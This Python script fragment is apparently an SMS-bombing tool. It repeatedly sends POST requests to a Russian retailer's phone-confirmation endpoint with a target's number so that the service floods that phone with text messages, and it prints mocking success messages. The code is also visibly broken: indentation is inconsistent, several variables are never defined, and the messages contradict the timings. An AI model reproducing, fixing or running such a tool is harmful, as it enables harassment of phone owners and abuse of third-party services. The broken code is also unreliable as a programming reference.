# -*- coding: utf-8 -*-
import time
import os
import datetime
import random
import sys
import requests
import threading
from threading import Timer, Thread
from datetime import datetime, timedelta
import random
from useragent import get_agent

def services():
            print(
            f"""

spam will start in 5 seconds, just wait.
if you want to stop, press CTRL + Z
			"""
        )
        time.sleep(5)
        for kolvo in range(kolvos):
            kolvo = int(kolvo)
            standar_headers = {"User-Agent": ua}

           
            try:
                requests.post(
                    "https://www.citilink.ru/registration/confirm/phone/+"
                    + _phone
                    + "/"
                )
                kk = kk + 1
                print(
                    f"SMS sent successfully LOL {_phonePizzahut}"
                )
                time.sleep(0.2)
            except:
                print(f"SMS sent successfully")

            kolvo = kolvo + 1
            if kolvo == kolvos:
                print(
                    f"the last cycle {kolvo} is over, im finishing work"
                )
                exit()
            else:
                print(
                    f"cycle {kolvo} passed, wait 5 seconds"
                )
                time.sleep(30)